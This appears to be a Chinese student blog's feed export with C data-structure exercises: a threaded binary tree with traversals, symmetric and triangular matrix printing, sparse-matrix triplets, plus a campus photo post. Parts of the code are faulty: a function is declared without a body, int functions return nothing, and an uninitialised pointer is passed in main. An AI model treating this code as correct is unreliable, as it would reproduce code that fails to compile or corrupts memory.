class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXNODE 10</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> Elemtype ;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiThrTreeNode</span></span><br><span class="hljs-class">&#123;</span><br>    Elemtype data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiThrTreeNode</span> *<span class="hljs-title">lchild</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiThrTreeNode</span> *<span class="hljs-title">rchild</span>;</span><br>    <span class="hljs-type">unsigned</span> ltag:<span class="hljs-number">1</span>;<br>    <span class="hljs-type">unsigned</span> rtag:<span class="hljs-number">1</span>;<br>&#125; BiThrTreeNode,*BiThrTree;<br><br>BiThrTree pre;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Visit</span><span class="hljs-params">(Elemtype data)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3d&quot;</span>,data);<br>&#125;<br><br><br>BiThrTree <span class="hljs-title function_">CreateTree</span><span class="hljs-params">(Elemtype x)</span><br>&#123;<br>    BiThrTree p;<br>    <span class="hljs-keyword">if</span>((p=(BiThrTree *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiThrTreeNode)))==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Empty tree.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class="hljs-literal">NULL</span>;<br>    p-&gt;rchild=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><br>BiThrTree <span class="hljs-title function_">InsertTreeLeftNode</span><span class="hljs-params">(BiThrTree T,Elemtype x,BiThrTree parent)</span><br>&#123;<br>    BiThrTree p;<br>    <span class="hljs-keyword">if</span>(parent==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such a parent.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>((p=(BiThrTree*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiThrTreeNode)))==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Empty tree.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class="hljs-literal">NULL</span>;<br>    p-&gt;rchild=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>(parent-&gt;lchild==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        parent-&gt;lchild=p;<br>        parent-&gt;ltag=<span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        p-&gt;lchild=parent-&gt;lchild;<br>        parent-&gt;lchild=p;<br>        parent-&gt;ltag=<span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Insert data %d to leftchild.\n&quot;</span>,x);<br>    <span class="hljs-keyword">return</span> T;<br>&#125;<br><br>BiThrTree <span class="hljs-title function_">InsertTreeRightNode</span><span class="hljs-params">(BiThrTree T,Elemtype x,BiThrTree parent)</span><br>&#123;<br>    BiThrTree p;<br>    <span class="hljs-keyword">if</span>(parent==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such a parent.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>((p=(BiThrTree*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiThrTreeNode)))==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Empty tree.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class="hljs-literal">NULL</span>;<br>    p-&gt;rchild=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>(parent-&gt;rchild==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        parent-&gt;rchild=p;<br>        parent-&gt;rtag=<span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        p-&gt;rchild=parent-&gt;rchild;<br>        parent-&gt;rchild=p;<br>        parent-&gt;rtag=<span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Insert data %d to rightchild.\n&quot;</span>,x);<br>    <span class="hljs-keyword">return</span> T;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">MiddleOrderTree</span><span class="hljs-params">(BiThrTree T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    MiddleOrderTree(T-&gt;lchild);<br>    Visit(T-&gt;data);<br>    MiddleOrderTree(T-&gt;rchild);<br><br>&#125;<br><br>BiThrTree <span class="hljs-title function_">MiddleOrderThr</span><span class="hljs-params">(BiThrTree T)</span><br><br>BiThrTree <span class="hljs-title function_">DeleteTreeLeftNode</span><span class="hljs-params">(BiThrTree T,BiThrTree parent)</span><br>&#123;<br>    BiThrTree p;<br>    <span class="hljs-keyword">if</span>(parent==<span class="hljs-literal">NULL</span>||parent-&gt;lchild==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No left child.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    p=parent-&gt;lchild;<br>    parent-&gt;lchild=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-keyword">return</span> T;<br>&#125;<br><br>BiThrTree <span class="hljs-title function_">DeleteTreeRightNode</span><span class="hljs-params">(BiThrTree T,BiThrTree parent)</span><br>&#123;<br>    BiThrTree p;<br>    <span class="hljs-keyword">if</span>(parent==<span class="hljs-literal">NULL</span>||parent-&gt;rchild==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No left child.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    p=parent-&gt;rchild;<br>    parent-&gt;rchild=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-keyword">return</span> T;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">PreOrderTree</span><span class="hljs-params">(BiThrTree T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Visit(T-&gt;data);<br>    PreOrderTree(T-&gt;lchild);<br>    PreOrderTree(T-&gt;rchild);<br><br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">LastOrderTree</span><span class="hljs-params">(BiThrTree T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    LastOrderTree(T-&gt;lchild);<br>    LastOrderTree(T-&gt;rchild);<br>    Visit(T-&gt;data);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">LevelOrderTree</span><span class="hljs-params">(BiThrTree T)</span><br>&#123;<br>    BiThrTree Queue[MAXNODE];<br>    <span class="hljs-type">int</span> front,rear;<br><br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    front=<span class="hljs-number">-1</span>;<br>    rear=<span class="hljs-number">-1</span>;<br>    Queue[++rear]=T;<br>    <span class="hljs-keyword">while</span>(front!=rear)<br>    &#123;<br>        Visit(Queue[++front]-&gt;data);<br>        <span class="hljs-keyword">if</span>(Queue[front]-&gt;lchild!=<span class="hljs-literal">NULL</span>)<br>        &#123;<br>            Queue[++rear]=Queue[front]-&gt;lchild;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(Queue[front]-&gt;rchild!=<span class="hljs-literal">NULL</span>)<br>        &#123;<br>            Queue[++rear]=Queue[front]-&gt;rchild;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    BiThrTree myTree;<br>    Elemtype rootData;<br>    <span class="hljs-type">int</span> numberOfNodes,index,choice;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please enter the node number:\n&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;numberOfNodes);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please enter the data of root node:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;rootData);<br><br>    myTree=CreateTree(rootData);<br><br>    <span class="hljs-keyword">for</span>(index=<span class="hljs-number">1</span>; index&lt;numberOfNodes; index++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No %d node&#x27;s position is:\n1.Leftchild of Root.\n2.Rightchild of Root.\n3.Leftchild of the Root&#x27;s leftchild.\n4.Rightchild of the Root&#x27;s leftchild.\n5.Leftchild of the Root&#x27;s rightchild.\n6.Rightchild of the Root&#x27;s rightchild.\n&quot;</span>,index);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Choice:&quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;choice);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please enter the %d data:&quot;</span>,index);<br>        Elemtype nodedata;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;nodedata);<br>        <span class="hljs-keyword">switch</span>(choice)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree-&gt;lchild);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree-&gt;lchild);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree-&gt;rchild);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree-&gt;rchild);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Preorder:&quot;</span>);<br>    PreOrderTree(myTree);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Middleorder:&quot;</span>);<br>    MiddleOrderTree(myTree);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Postorder:&quot;</span>);<br>    LastOrderTree(myTree);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Leverorder:&quot;</span>);<br>    LevelOrderTree(myTree);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure><h3 id="3-哈夫曼树"><a href="#3-哈夫曼树" class="headerlink" title="3.哈夫曼树"></a>3.哈夫曼树</h3>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>特殊矩阵及广义表</title>
    <link href="/2021/08/20/CH4%20%E7%89%B9%E6%AE%8A%E7%9F%A9%E9%98%B5%E5%B9%BF%E4%B9%89%E8%A1%A8/"/>
    <url>/2021/08/20/CH4%20%E7%89%B9%E6%AE%8A%E7%9F%A9%E9%98%B5%E5%B9%BF%E4%B9%89%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>一、对称矩阵</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PrintSymetryMatrix</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> m[],<span class="hljs-built_in">int</span> n</span>)</span><br>&#123;<br>    <span class="hljs-built_in">int</span> row,col;<br>    printf(<span class="hljs-string">&quot;Symetry Matrix:\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(row=<span class="hljs-number">0</span>;row&lt;n;row++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(col=<span class="hljs-number">0</span>;col&lt;n;col++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(row&gt;=col)<br>            &#123;<br>                printf(<span class="hljs-string">&quot;%4d &quot;</span>,m[row*(row+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>+col]);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                printf(<span class="hljs-string">&quot;%4d &quot;</span>,m[col*(col+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>+row]);<br>            &#125;<br>        &#125;<br>        printf(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​                    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> Elemtype;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxSize 100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> rowIndex,colIndex;<br>    Elemtype data;<br>&#125; TriUnitGroup;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    TriUnitGroup data[MaxSize+<span class="hljs-number">1</span>];<br>    <span class="hljs-type">int</span> unzeroNumber,colNumber,rowNumber;<br>&#125; TSMatrix;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    TSMatrix *myMatrix;<br>    <span class="hljs-type">int</span> myData[<span class="hljs-number">16</span>]= &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>&#125;;<br>    CreateM(&amp;myMatrix,myData,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>);<br>    PrintTripleUnitMatrix(&amp;myMatrix);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">CreateM</span><span class="hljs-params">(TSMatrix *M,<span class="hljs-type">int</span> data[],<span class="hljs-type">int</span> row,<span class="hljs-type">int</span> col)</span><br>&#123;<br><br>    <span class="hljs-type">int</span> index=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> count=<span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span>(index=<span class="hljs-number">0</span>; index&lt;row*col; index++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(data[index]!=<span class="hljs-number">0</span>)<br>        &#123;<br>            M-&gt;data[count].rowIndex=index/col;<br>            M-&gt;data[count].colIndex=index%col;<br>            M-&gt;data[count].data=data[index];<br>            ++count;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d Add data %d successfully.\n&quot;</span>,count,data[index]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(count&gt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Data number:%d.\n&quot;</span>,count);<br>        <span class="hljs-comment">/*Errors here.*/</span><br>        M-&gt;unzeroNumber=count;<br>        M-&gt;colNumber=col;<br>        M-&gt;rowNumber=row;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finished.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;All data are 0.\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finished.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">PrintTripleUnitMatrix</span><span class="hljs-params">(TSMatrix *M)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*  i  j  value\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> index1=<span class="hljs-number">0</span>; index1&lt;M-&gt;unzeroNumber; index1++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d  %d  %d  %d\n&quot;</span>,index1,M-&gt;data[index1].rowIndex,M-&gt;data[index1].colIndex,M-&gt;data[index1].data);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">PrintSymmetricArray</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[],<span class="hljs-type">int</span> col,<span class="hljs-type">int</span> row)</span><br>&#123;<br>    <span class="hljs-type">int</span> col_index,row_index;<br><br>    <span class="hljs-keyword">for</span>(col_index=<span class="hljs-number">0</span>; col_index&lt;col; col_index++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(row_index=<span class="hljs-number">0</span>; row_index&lt;row; row_index++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(col_index&lt;=row_index)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[row_index*(row_index+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>+col_index]);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[col_index*(col_index+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>+row_index]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">PrintUpTriangle</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[],<span class="hljs-type">int</span> col,<span class="hljs-type">int</span> row)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> index1=<span class="hljs-number">0</span>; index1&lt;col; index1++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> index2=<span class="hljs-number">0</span>; index2&lt;row; index2++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(index1&lt;index2)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[index1*(index1+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>+<span class="hljs-number">1</span>+index2]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">PrintDownTriangle</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[],<span class="hljs-type">int</span> col,<span class="hljs-type">int</span> row)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> index1=<span class="hljs-number">0</span>; index1&lt;col; index1++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> index2=<span class="hljs-number">0</span>; index2&lt;row; index2++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(index1&gt;index2)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[index2*(index2+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>+<span class="hljs-number">1</span>+index1]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>队列和栈</title>
    <link href="/2021/08/15/Ch2%20%E9%98%9F%E5%88%97%E5%92%8C%E6%A0%88/"/>
    <url>/2021/08/15/Ch2%20%E9%98%9F%E5%88%97%E5%92%8C%E6%A0%88/</url>
    
    <content type="html"><![CDATA[<p>Ch1 栈和队列</p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Autumn_XDU</title>
    <link href="/2021/08/09/XDU-Autumn/"/>
    <url>/2021/08/09/XDU-Autumn/</url>
    
    <content type="html"><![CDATA[<h2 id="XDU的秋天"><a href="#XDU的秋天" class="headerlink" title="XDU的秋天"></a>XDU的秋天</h2><blockquote><p>呜呜呜,XD的秋天也太好看了吧~~<br><img src="https://img-blog.csdnimg.cn/20201028201708370.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201028201707987.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201028201707948.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>摄影</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>顺序表</title>
    <link href="/2021/08/08/CH1%20%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E5%8F%8A%E5%AE%9E%E7%8E%B0%EF%BC%88C%EF%BC%89/"/>
